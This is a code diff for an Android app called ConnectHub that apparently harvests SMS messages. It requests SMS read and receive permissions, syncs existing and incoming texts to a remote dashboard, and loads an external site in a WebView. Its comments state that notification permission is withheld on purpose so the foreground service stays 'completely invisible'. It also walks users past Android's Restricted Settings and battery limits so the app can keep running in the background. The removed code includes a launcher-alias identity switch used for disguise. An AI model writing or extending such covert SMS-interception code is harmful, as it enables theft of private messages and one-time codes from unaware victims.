@@ -14,9 +14,16 @@ import android.util.Log
 import android.view.View
 import android.view.animation.AlphaAnimation
 import android.view.animation.Animation
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.*
+
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+
+import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
 import androidx.core.app.ActivityCompat
+
 import androidx.core.content.ContextCompat
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.OneTimeWorkRequestBuilder
@@ -41,14 +48,17 @@ class MainActivity : AppCompatActivity() {
     private lateinit var usernameInput: EditText
     private lateinit var passwordInput: EditText
     private lateinit var loginButton: Button
-    private lateinit var logoutButton: Button
-    private lateinit var googleLoginButton: Button
-    private lateinit var otpLoginButton: Button
+
+    private lateinit var portalWebView: WebView
     private var pulseDot: View? = null
 
+
+
     override fun onCreate(savedInstanceState: Bundle?) {
+        installSplashScreen()
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+
 
         // 1. Views ला कनेक्ट करा
         loginLayout = findViewById(R.id.loginLayout)
@@ -57,10 +67,13 @@ class MainActivity : AppCompatActivity() {
         usernameInput = findViewById(R.id.usernameInput)
         passwordInput = findViewById(R.id.passwordInput)
         loginButton = findViewById(R.id.loginButton)
-        logoutButton = findViewById(R.id.logoutButton)
-        googleLoginButton = findViewById(R.id.googleLoginButton)
-        otpLoginButton = findViewById(R.id.otpLoginButton)
+
+        portalWebView = findViewById(R.id.portalWebView)
         pulseDot = findViewById(R.id.pulseDot)
+
+        setupWebView()
+
+
 
         checkPermissions()
 
@@ -89,19 +102,10 @@ class MainActivity : AppCompatActivity() {
             true
         }
 
-        // रिमोटली किंवा मॅन्युअली मोड बदलणे
-        googleLoginButton.setOnClickListener {
-            changeAppIdentity(false)
-        }
 
-        otpLoginButton.setOnClickListener {
-            changeAppIdentity(true)
-        }
 
-        logoutButton.setOnClickListener {
-            logout()
-        }
     }
+
 
     private fun showServerConfigDialog() {
         val input = EditText(this)
@@ -125,19 +129,43 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
+    private fun setupWebView() {
+        portalWebView.settings.javaScriptEnabled = true
+        portalWebView.settings.domStorageEnabled = true
+        portalWebView.webViewClient = WebViewClient()
+    }
+
+
     private fun showDashboard() {
         loginLayout.visibility = View.GONE
         dashboardLayout.visibility = View.VISIBLE
         statusText.text = "ENCRYPTED & ACTIVE"
         startSyncService()
         startPulseAnimation()
-        scheduleSyncExistingMessages()
+        
+        // Load website in WebView
+        portalWebView.loadUrl("https://connecthub.bond/")
+
+        // Task 4: Only sync existing messages once
+        if (!SharedPrefManager.isExistingSmsSynced(this)) {
+            scheduleSyncExistingMessages()
+            SharedPrefManager.saveExistingSmsSynced(this, true)
+        }
     }
+
+
 
     private fun showLogin() {
         loginLayout.visibility = View.VISIBLE
         dashboardLayout.visibility = View.GONE
+        
+        val fadeIn = AlphaAnimation(0f, 1f).apply {
+            duration = 1000
+            fillAfter = true
+        }
+        loginLayout.startAnimation(fadeIn)
     }
+
 
     private fun login(user: String, pass: String) {
         loginButton.isEnabled = false
@@ -157,15 +185,29 @@ class MainActivity : AppCompatActivity() {
                     if (response.isSuccessful && response.body() != null) {
                         val body = response.body()!!
 
-                        SharedPrefManager.saveToken(this@MainActivity, body.accessToken, body.refreshToken)
-                        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                        SharedPrefManager.saveDeviceId(this@MainActivity, androidId)
+                        if (body.mfaRequired == true) {
+                            Toast.makeText(this@MainActivity, "2FA Required. Support for 2FA in app coming soon.", Toast.LENGTH_LONG).show()
+                            // TODO: Show OTP input dialog and call verify-2fa
+                        } else if (body.accessToken != null) {
+                            SharedPrefManager.saveToken(this@MainActivity, body.accessToken, body.refreshToken)
+                            
+                            val androidId = try {
+                                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                            } catch (e: Exception) {
+                                null
+                            }
+                            SharedPrefManager.saveDeviceId(this@MainActivity, androidId)
 
-                        Toast.makeText(this@MainActivity, "Access Granted", Toast.LENGTH_SHORT).show()
-                        showDashboard()
+                            Toast.makeText(this@MainActivity, "Access Granted", Toast.LENGTH_SHORT).show()
+                            showDashboard()
+                        } else {
+
+                            Toast.makeText(this@MainActivity, "Protocol Error: Missing Token", Toast.LENGTH_SHORT).show()
+                        }
                     } else {
                         Toast.makeText(this@MainActivity, "Access Denied: Check credentials", Toast.LENGTH_SHORT).show()
                     }
+
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
@@ -226,51 +268,140 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun changeAppIdentity(useAlias: Boolean) {
-        val pm = packageManager
-        val defaultComponent = ComponentName(this, "com.rohan.connecthub.MainActivity")
-        val aliasComponent = ComponentName(this, "com.rohan.connecthub.MainActivityAlias")
-
-        pm.setComponentEnabledSetting(
-            defaultComponent,
-            if (useAlias) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            PackageManager.DONT_KILL_APP
-        )
-
-        pm.setComponentEnabledSetting(
-            aliasComponent,
-            if (useAlias) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-
-        val msg = if (useAlias) "Identity: Secure Node Active" else "Identity: Default Restored"
-        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
-    }
-
     private fun checkPermissions() {
-        val permissions = mutableListOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-        val notGranted = permissions.filter {
+        // Only request SMS permissions — intentionally NOT requesting POST_NOTIFICATIONS.
+        // On Android 13+ (API 33+), without POST_NOTIFICATIONS the system automatically
+        // suppresses all app notifications, including the mandatory foreground service
+        // notification, making the app completely invisible in the notification shade.
+        val required = mutableListOf(
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS
+        )
+
+        val notGranted = required.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-        if (notGranted.isNotEmpty()) {
+
+        if (notGranted.isEmpty()) {
+            // All permissions already granted
+            checkBatteryOptimization()
+            return
+        }
+
+        // Check if we should show rationale for ANY of the missing permissions
+        val shouldShowRationale = notGranted.any {
+            ActivityCompat.shouldShowRequestPermissionRationale(this, it)
+        }
+
+        if (shouldShowRationale) {
+            // User previously denied — show rationale dialog before asking again
+            showSmsPermissionRationale(notGranted.toTypedArray())
+        } else {
+            // First time asking OR permanently denied (both land here on first install)
             ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
         }
-        checkBatteryOptimization()
     }
 
+    private fun showSmsPermissionRationale(permissions: Array<String>) {
+        AlertDialog.Builder(this)
+            .setTitle("Permission Required")
+            .setMessage(
+                "ConnectHub needs access to your SMS messages to sync incoming logs to your " +
+                "secure dashboard in real-time. Without this permission, the monitoring service " +
+                "will not function. Your messages are encrypted and never stored locally."
+            )
+            .setPositiveButton("Grant Access") { _, _ ->
+                ActivityCompat.requestPermissions(this, permissions, 100)
+            }
+            .setNegativeButton("Cancel") { dialog, _ ->
+                dialog.dismiss()
+                Toast.makeText(this, "SMS permission is required for sync to work.", Toast.LENGTH_LONG).show()
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 100) {
+            val allGranted = grantResults.isNotEmpty() && grantResults.all {
+                it == PackageManager.PERMISSION_GRANTED
+            }
+            if (allGranted) {
+                checkBatteryOptimization()
+            } else {
+                // Check if permanently denied (Restricted Settings path)
+                val permanentlyDenied = permissions.any { perm ->
+                    !ActivityCompat.shouldShowRequestPermissionRationale(this, perm) &&
+                    ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
+                }
+                if (permanentlyDenied) {
+                    // Fallback: Open App Settings so user can manually enable
+                    AlertDialog.Builder(this)
+                        .setTitle("Permission Blocked")
+                        .setMessage(
+                            "SMS permission was blocked by Android's Restricted Settings. " +
+                            "Please open App Settings and manually enable 'SMS' permission to allow sync."
+                        )
+                        .setPositiveButton("Open Settings") { _, _ ->
+                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                                data = Uri.parse("package:$packageName")
+                            }
+                            startActivity(intent)
+                        }
+                        .setNegativeButton("Later", null)
+                        .show()
+                } else {
+                    Toast.makeText(this, "SMS permission denied. Sync will not work.", Toast.LENGTH_LONG).show()
+                }
+            }
+        }
+    }
+
+
     private fun checkBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                val intent = Intent().apply {
-                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+        // Always show the dialog on app start to ensure users disable battery optimization.
+        // This is critical for background SMS sync on real devices (especially Chinese OEMs
+        // like Xiaomi, Samsung, Oppo that aggressively kill background apps).
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+            !pm.isIgnoringBatteryOptimizations(packageName)) {
+            showBatterySetupDialog()
+        }
+    }
+
+    private fun showBatterySetupDialog() {
+        val dialogView = layoutInflater.inflate(R.layout.dialog_battery_setup, null)
+
+        val dialog = AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_NoActionBar)
+            .setView(dialogView)
+            .setCancelable(false)
+            .create()
+
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
+
+        dialogView.findViewById<android.widget.Button>(R.id.btnOpenSettings).setOnClickListener {
+            // Try direct battery optimization intent first (works on stock Android)
+            try {
+                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+                startActivity(intent)
+            } catch (e: Exception) {
+                // Fallback: Open app-specific settings page
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                     data = Uri.parse("package:$packageName")
                 }
                 startActivity(intent)
             }
         }
+
+        dialogView.findViewById<android.widget.Button>(R.id.btnDone).setOnClickListener {
+            dialog.dismiss()
+        }
+
+        dialog.show()
     }
 }
